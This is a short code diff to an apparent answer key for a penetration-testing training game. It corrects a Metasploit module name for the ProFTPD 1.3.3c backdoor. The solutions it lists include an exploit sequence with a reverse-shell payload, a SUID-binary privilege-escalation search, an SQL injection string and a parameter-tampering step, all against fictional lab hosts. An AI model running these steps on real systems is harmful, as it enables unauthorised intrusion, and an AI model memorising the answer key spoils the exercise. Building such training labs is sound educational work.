@@ -25,7 +25,7 @@ export const SOLUTIONS: Record<number, string[]> = {
     "vulnscan --host 10.42.20.10",
     'searchsploit "ProFTPD 1.3.3c"',
   ],
-  8: ["use exploit/unix/ftp/proftpd_backdoor", "set RHOST 10.42.20.10", "set PAYLOAD cmd/unix/reverse", "exploit"],
+  8: ["use exploit/unix/ftp/proftpd_133c_backdoor", "set RHOST 10.42.20.10", "set PAYLOAD cmd/unix/reverse", "exploit"],
   9: ["enumerate", "find / -perm -u=s -type f", "strings /opt/aether/bin/system-backup", "priv-esc --vector path-hijack"],
   10: ["proxy-intercept --target cloud.aetherdyn.internal", 'inject-sql --payload "admin\' OR \'1\'=\'1\' --"'],
   11: ["api-probe --endpoint /user/profile", "tamper --param user_id=0001"],
